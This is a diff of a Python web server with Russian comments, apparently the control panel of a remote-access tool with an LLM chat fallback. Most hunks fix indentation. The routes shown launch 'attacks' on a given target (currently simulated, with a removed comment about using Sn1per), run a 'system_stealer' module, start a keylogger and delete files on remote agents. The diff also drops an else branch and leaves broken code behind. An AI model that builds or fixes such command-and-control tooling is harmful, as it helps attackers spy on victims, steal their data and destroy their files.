@@ -671,16 +671,16 @@ Your default language for responses is Russian, but you can switch to English if
     # Проверяем доступность Gemini API
     if gemini_client is not None and gemini_client.is_available():
         try:
-        # Используем Gemini API для генерации ответа
-        return gemini_client.generate_response(message, system_prompt)
+            # Используем Gemini API для генерации ответа
+            return gemini_client.generate_response(message, system_prompt)
         except Exception as e:
             logger.error(f"Ошибка генерации ответа через Gemini: {str(e)}")
     
     # Если Gemini недоступен, пробуем OpenAI
     if openai_client is not None and openai_client.is_available():
         try:
-        # Используем OpenAI API для генерации ответа
-        return openai_client.generate_response(message, system_prompt)
+            # Используем OpenAI API для генерации ответа
+            return openai_client.generate_response(message, system_prompt)
         except Exception as e:
             logger.error(f"Ошибка генерации ответа через OpenAI: {str(e)}")
     
@@ -1312,27 +1312,15 @@ async def execute_attack(request: Request):
         data = await request.json()
         target = data.get("target", "")
         attack_type = data.get("attack_type", "")
-        
-        # Логируем попытку атаки
         logger.info(f"Запрос на атаку: {attack_type} на {target}")
-        
-        # Здесь будет запускаться реальная атака через интеграцию с Sn1per или другими инструментами
-        # Пока возвращаем заглушку с результатами
-        
-        # Добавляем сообщения в reasoning_logs
         global reasoning_logs
         reasoning_logs.append({
             "timestamp": datetime.now().strftime("%H:%M:%S"),
-            "type": "action", 
+            "type": "action",
             "message": f"Запуск атаки {attack_type} на {target}..."
         })
-        
-        # Имитация задержки выполнения
         time.sleep(1)
-        
-        # Случайный результат атаки
         success = random.random() > 0.3
-        
         if success:
             result_message = f"Атака {attack_type} на {target} успешна. Получен доступ к системе."
             reasoning_logs.append({
@@ -1340,8 +1328,8 @@ async def execute_attack(request: Request):
                 "type": "result",
                 "message": result_message
             })
-    return JSONResponse({
-        "status": "success",
+            return JSONResponse({
+                "status": "success",
                 "message": result_message,
                 "data": {
                     "access_level": "admin" if random.random() > 0.5 else "user",
@@ -1355,7 +1343,7 @@ async def execute_attack(request: Request):
                 "type": "result",
                 "message": result_message
             })
-        return JSONResponse({
+            return JSONResponse({
                 "status": "failed",
                 "message": result_message,
                 "data": {
@@ -1367,7 +1355,7 @@ async def execute_attack(request: Request):
                     ]),
                     "timestamp": datetime.now().strftime("%H:%M:%S")
                 }
-        })
+            })
     except Exception as e:
         logger.error(f"Ошибка при выполнении атаки: {str(e)}")
         return JSONResponse({
@@ -1632,7 +1620,7 @@ async def steal_system_info(agent_id: str):
         loader = ModuleLoader()
         result = loader.run_module("system_stealer")
         return {"status": "success", "result": result}
-        except Exception as e:
+    except Exception as e:
         return {"status": "error", "message": str(e)}
 
 @app.post("/api/agent/{agent_id}/keylogger/start")
@@ -1700,9 +1688,6 @@ async def file_manager(agent_id: str, data: dict = Body(...)):
             # Удаление файла
             result = loader.run_module("file_manager", action="delete", path=path)
             return {"status": "success", "deleted": result.get("deleted", False)}
-            
-    else:
-            return {"status": "error", "message": f"Неподдерживаемое действие: {action}"}
             
     except Exception as e:
         return {"status": "error", "message": str(e)}
